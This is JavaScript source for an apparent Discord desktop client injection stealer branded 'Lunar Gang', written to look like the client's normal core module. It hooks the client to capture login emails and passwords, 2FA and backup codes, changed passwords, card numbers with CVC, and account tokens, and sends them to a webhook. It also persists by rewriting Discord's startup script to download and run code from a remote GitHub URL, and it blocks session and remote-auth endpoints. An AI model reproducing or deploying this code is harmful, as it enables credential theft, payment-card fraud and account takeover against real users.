const fs = require('fs');
const os = require('os');
const https = require('https');
const args = process.argv;
const path = require('path');
const querystring = require('querystring');

const {
    BrowserWindow,
    session,
} = require('electron');

const CONFIG = {
    webhook: "%WEBHOOK%",
    injection_url: "https://raw.githubusercontent.com/ymglindo/lunar/refs/heads/main/index.js",
    filters: {
        urls: [
            '/auth/login',
            '/auth/register',
            '/mfa/totp',
            '/mfa/codes-verification',
            '/users/@me',
        ],
    },
    filters2: {
        urls: [
            'wss://remote-auth-gateway.discord.gg/*',
            'https://discord.com/api/v*/auth/sessions',
            'https://*.discord.com/api/v*/auth/sessions',
            'https://discordapp.com/api/v*/auth/sessions'
        ],
    },
    payment_filters: {
        urls: [
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ],
    },
    API: "https://discord.com/api/v9/users/@me",
    badges: {
        Discord_Emloyee: {
            Value: 1,
            Emoji: "<:8485discordemployee:1163172252989259898>",
            Rare: true,
        },
        Partnered_Server_Owner: {
            Value: 2,
            Emoji: "<:9928discordpartnerbadge:1163172304155586570>",
            Rare: true,
        },
        HypeSquad_Events: {
            Value: 4,
            Emoji: "<:9171hypesquadevents:1163172248140660839>",
            Rare: true,
        },
        Bug_Hunter_Level_1: {
            Value: 8,
            Emoji: "<:4744bughunterbadgediscord:1163172239970140383>",
            Rare: true,
        },
        Early_Supporter: {
            Value: 512,
            Emoji: "<:5053earlysupporter:1163172241996005416>",
            Rare: true,
        },
        Bug_Hunter_Level_2: {
            Value: 16384,
            Emoji: "<:1757bugbusterbadgediscord:1163172238942543892>",
            Rare: true,
        },
        Early_Verified_Bot_Developer: {
            Value: 131072,
            Emoji: "<:1207iconearlybotdeveloper:1163172236807639143>",
            Rare: true,
        },
        House_Bravery: {
            Value: 64,
            Emoji: "<:6601hypesquadbravery:1163172246492287017>",
            Rare: false,
        },
        House_Brilliance: {
            Value: 128,
            Emoji: "<:6936hypesquadbrilliance:1163172244474822746>",
            Rare: false,
        },
        House_Balance: {
            Value: 256,
            Emoji: "<:5242hypesquadbalance:1163172243417858128>",
            Rare: false,
        },
        Active_Developer: {
            Value: 4194304,
            Emoji: "<:1207iconactivedeveloper:1163172534443851868>",
            Rare: false,
        },
        Certified_Moderator: {
            Value: 262144,
            Emoji: "<:4149blurplecertifiedmoderator:1163172255489085481>",
            Rare: true,
        },
        Spammer: {
            Value: 1048704,
            Emoji: "⌨️",
            Rare: false,
        },
    },
};

const executeJS = script => {
    const window = BrowserWindow.getAllWindows()[0];
    return window.webContents.executeJavaScript(script, !0);
};

const clearAllUserData = () => {
    executeJS("document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()");
    executeJS("location.reload()");
};

const getToken = async () => await executeJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);

const request = async (method, url, headers, data) => {
    url = new URL(url);
    const options = {
        protocol: url.protocol,
        hostname: url.host,
        path: url.pathname,
        method: method,
        headers: {
            "Access-Control-Allow-Origin": "*",
        },
    };

    if (url.search) options.path += url.search;
    for (const key in headers) options.headers[key] = headers[key];
    const req = https.request(options);
    if (data) req.write(data);
    req.end();

    return new Promise((resolve, reject) => {
        req.on("response", res => {
            let data = "";
            res.on("data", chunk => data += chunk);
            res.on("end", () => resolve(data));
        });
    });
};

const hooker = async (content, token, account) => {
    content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
    content["username"] = "Lunar Gang";
    content["avatar_url"] = "https://cdn.discordapp.com/attachments/1438563954627444817/1439768810084106320/lunargang.png";
    content["embeds"][0]["author"] = {
        "name": account.username,
    };
    content["embeds"][0]["thumbnail"] = {
        "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
    };
    content["embeds"][0]["footer"] = {
        "text": "Lunar Gang",
        "icon_url": "https://cdn.discordapp.com/attachments/1438563954627444817/1439768810084106320/lunargang.png",
    };
    content["embeds"][0]["title"] = "Account Information";

    const nitro = getNitro(account.premium_type);
    const badges = getBadges(account.flags);
    const billing = await getBilling(token);

    const friends = await getFriends(token);
    const servers = await getServers(token);

    content["embeds"][0]["fields"].push({
        "name": "Token",
        "value": "```" + token + "```",
        "inline": false
    }, {
        "name": "Nitro",
        "value": nitro,
        "inline": true
    }, {
        "name": "Badges",
        "value": badges,
        "inline": true
    }, {
        "name": "Billing",
        "value": billing,
        "inline": true
    });

    content["embeds"].push({
        "title": `Total Friends: ${friends.totalFriends}`,
        "description": friends.message,
    }, {
        "title": `Total Servers: ${servers.totalGuilds}`,
        "description": servers.message,
    });

    for (const embed in content["embeds"]) {
        content["embeds"][embed]["color"] = 0xb143e3;
    }

    await request("POST", CONFIG.webhook, {
        "Content-Type": "application/json"
    }, JSON.stringify(content));
};

const fetch = async (endpoint, headers) => {
    return JSON.parse(await request("GET", CONFIG.API + endpoint, headers));
};

const fetchAccount = async token => await fetch("", {
    "Authorization": token
});
const fetchBilling = async token => await fetch("/billing/payment-sources", {
    "Authorization": token
});
const fetchServers = async token => await fetch("/guilds?with_counts=true", {
    "Authorization": token
});
const fetchFriends = async token => await fetch("/relationships", {
    "Authorization": token
});

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${account.id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:lvl1:1219031125247266887>", "<:lvl2:1219031171942449282>", "<:lvl3:1219031999847858216>", "<:lvl4:1219031250950684763>", "<:lvl5:1219031294176919603>", "<:lvl6:1219031344324022425>", "<:lvl7:1219031400607645816>", "<:lvl8:1219031431280332910>", "<:lvl9:1219031069974724638>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

const getBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value) badges += b.Emoji + ' ';
    }
    return badges || '`❌`';
}

const getRareBadges = flags => {
    let badges = '';
    for (const badge in CONFIG.badges) {
        let b = CONFIG.badges[badge];
        if ((flags & b.Value) == b.Value && b.Rare) badges += b.Emoji + ' ';
    }
    return badges;
}

const getBilling = async token => {
    const data = await fetchBilling(token);
    let billing = '';
    data.forEach((x) => {
        if (!x.invalid) {
            switch (x.type) {
                case 1:
                    billing += '💳 ';
                    break;
                case 2:
                    billing += '<:paypal:1148653305376034967> ';
                    break;
            }
        }
    });
    return billing || '`❌`';
};

const getFriends = async token => {
    const friends = await fetchFriends(token);

    const filteredFriends = friends.filter((user) => {
        return user.type == 1
    })
    let rareUsers = "";
    for (const acc of filteredFriends) {
        var badges = getRareBadges(acc.user.public_flags)
        if (badges != "") {
            if (!rareUsers) rareUsers = "**Rare Friends:**\n";
            rareUsers += `${badges} ${acc.user.username}\n`;
        }
    }
    rareUsers = rareUsers || "**No Rare Friends**";

    return {
        message: rareUsers,
        totalFriends: friends.length,
    };
};

const getServers = async token => {
    const guilds = await fetchServers(token);

    const filteredGuilds = guilds.filter((guild) => guild.permissions == '562949953421311' || guild.permissions == '2251799813685247');
    let rareGuilds = "";
    for (const guild of filteredGuilds) {
        if (rareGuilds === "") {
            rareGuilds += `**UHQ Servers:**\n`;
        }
        rareGuilds += `${guild.owner ? "<:SA_Owner:991312415352430673> Owner" : "<:admin:967851956930482206> Admin"} | Server Name: \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
    }

    rareGuilds = rareGuilds || "**No UHQ Servers**";

    return {
        message: rareGuilds,
        totalGuilds: guilds.length,
    };
};

const EmailPassToken = async (email, password, token, action) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just ${action}!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + email + "`",
                "inline": true
            }, {
                "name": "Password",
                "value": "`" + password + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const BackupCodesViewed = async (codes, token) => {
    const account = await fetchAccount(token)

    const filteredCodes = codes.filter((code) => {
        return code.consumed === false;
    });

    let message = "";
    for (let code of filteredCodes) {
        message += `${code.code.substr(0, 4)}-${code.code.substr(4)}\n`;
    }
    const content = {
        "content": `**${account.username}** just viewed his 2FA backup codes!`,
        "embeds": [{
            "fields": [{
                    "name": "Backup Codes",
                    "value": "```" + message + "```",
                    "inline": false
                },
                {
                    "name": "Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }
            ]

        }]
    };

    hooker(content, token, account);
}

const PasswordChanged = async (newPassword, oldPassword, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just changed his password!`,
        "embeds": [{
            "fields": [{
                "name": "New Password",
                "value": "`" + newPassword + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const CreditCardAdded = async (number, cvc, month, year, token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a credit card! 💳`,
        "embeds": [{
            "fields": [{
                "name": "Number",
                "value": "`" + number + "`",
                "inline": true
            }, {
                "name": "CVC",
                "value": "`" + cvc + "`",
                "inline": true
            }, {
                "name": "Expiration",
                "value": "`" + month + "/" + year + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const PaypalAdded = async (token) => {
    const account = await fetchAccount(token)

    const content = {
        "content": `**${account.username}** just added a <:paypal:1148653305376034967> account!`,
        "embeds": [{
            "fields": [{
                "name": "Email",
                "value": "`" + account.email + "`",
                "inline": true
            }, {
                "name": "Phone",
                "value": "`" + (account.phone || "None") + "`",
                "inline": true
            }]
        }]
    };

    hooker(content, token, account);
}

const discordPath = (function () {
    const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
    let resourcePath;

    if (process.platform === 'win32') {
        resourcePath = path.join(app, 'resources');
    } else if (process.platform === 'darwin') {
        resourcePath = path.join(app, 'Contents', 'Resources');
    }

    if (fs.existsSync(resourcePath)) return {
        resourcePath,
        app
    };
    return {
        undefined,
        undefined
    };
})();

async function initiation() {
    if (fs.existsSync(path.join(__dirname, 'initiation'))) {
        fs.rmdirSync(path.join(__dirname, 'initiation'));

        const token = await getToken();
        if (!token) return;

        const account = await fetchAccount(token)

        const content = {
            "content": `**${account.username}** Injection worked`,

            "embeds": [{
                "fields": [{
                    "name": "Email",
                    "value": "`" + account.email + "`",
                    "inline": true
                }, {
                    "name": "Phone",
                    "value": "`" + (account.phone || "None") + "`",
                    "inline": true
                }]
            }]
        };

        await hooker(content, token, account);
        clearAllUserData();
    }

    const {
        resourcePath,
        app
    } = discordPath;
    if (resourcePath === undefined || app === undefined) return;
    const appPath = path.join(resourcePath, 'app');
    const packageJson = path.join(appPath, 'package.json');
    const resourceIndex = path.join(appPath, 'index.js');
    const coreVal = fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]
    const indexJs = `${app}\\modules\\${coreVal}\\discord_desktop_core\\index.js`;
    const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

    if (process.platform === 'win32' || process.platform === 'darwin') {
        fs.writeFileSync(
            packageJson,
            JSON.stringify({
                    name: 'discord',
                    main: 'index.js',
                },
                null,
                4,
            ),
        );

        const startUpScript = `const fs = require('fs'), https = require('https');
  const indexJs = '${indexJs}';
  const bdPath = '${bdPath}';
  const fileSize = fs.statSync(indexJs).size
  fs.readFileSync(indexJs, 'utf8', (err, data) => {
      if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
          init();
  })
  async function init() {
      https.get('${CONFIG.injection_url}', (res) => {
          const file = fs.createWriteStream(indexJs);
          res.replace('%WEBHOOK%', '${CONFIG.webhook}')
          res.pipe(file);
          file.on('finish', () => {
              file.close();
          });
      
      }).on("error", (err) => {
          setTimeout(init(), 10000);
      });
  }
  require('${path.join(resourcePath, 'app.asar')}')
  if (fs.existsSync(bdPath)) require(bdPath);`;
        fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
    }
}

let email = "";
let password = "";
let initiationCalled = false;
const createWindow = () => {
    mainWindow = BrowserWindow.getAllWindows()[0];
    if (!mainWindow) return

    mainWindow.webContents.debugger.attach('1.3');
    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
        if (!initiationCalled) {
            await initiation();
            initiationCalled = true;
        }

        if (method !== 'Network.responseReceived') return;
        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
        if (![200, 202].includes(params.response.status)) return;

        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
            requestId: params.requestId
        });
        const responseData = JSON.parse(responseUnparsedData.body);

        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
            requestId: params.requestId
        });
        const requestData = JSON.parse(requestUnparsedData.postData);

        switch (true) {
            case params.response.url.endsWith('/login'):
                if (!responseData.token) {
                    email = requestData.login;
                    password = requestData.password;
                    return; // 2FA
                }
                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                break;

            case params.response.url.endsWith('/register'):
                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
                break;

            case params.response.url.endsWith('/totp'):
                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
                break;

            case params.response.url.endsWith('/codes-verification'):
                BackupCodesViewed(responseData.backup_codes, await getToken());
                break;

            case params.response.url.endsWith('/@me'):
                if (!requestData.password) return;

                if (requestData.email) {
                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
                }

                if (requestData.new_password) {
                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
                }
                break;
        }
    });

    mainWindow.webContents.debugger.sendCommand('Network.enable');

    mainWindow.on('closed', () => {
        createWindow()
    });
}
createWindow();

session.defaultSession.webRequest.onCompleted(CONFIG.payment_filters, async (details, _) => {
    if (![200, 202].includes(details.statusCode)) return;
    if (details.method != 'POST') return;
    switch (true) {
        case details.url.endsWith('tokens'):
            const item = querystring.parse(Buffer.from(details.uploadData[0].bytes).toString());
            CreditCardAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], await getToken());
            break;

        case details.url.endsWith('paypal_accounts'):
            PaypalAdded(await getToken());
            break;
    }
});

session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, callback) => {
    if (details.url.startsWith("wss://remote-auth-gateway") || details.url.endsWith("auth/sessions")) return callback({
        cancel: true
    })
});

module.exports = require("./core.asar");
